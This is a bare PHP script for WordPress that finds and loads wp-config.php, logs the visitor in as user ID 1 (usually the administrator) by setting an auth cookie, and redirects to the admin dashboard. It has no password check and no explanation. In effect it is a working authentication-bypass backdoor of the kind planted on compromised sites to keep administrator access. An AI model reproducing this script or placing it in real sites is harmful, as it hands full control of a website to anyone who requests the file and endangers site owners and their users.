<?php
$path = __DIR__;
while ($path && !file_exists($path . '/wp-config.php')) {
    $parent_path = dirname($path);
    if ($parent_path === $path) break;
    $path = $parent_path;
}

if ($path && file_exists($path . '/wp-config.php')) {
    include($path . '/wp-config.php');
    wp_clear_auth_cookie();
    wp_set_current_user(1);
    wp_set_auth_cookie(1);
    wp_safe_redirect(admin_url());
} else {
    echo 'wp-config.php file not found';
}
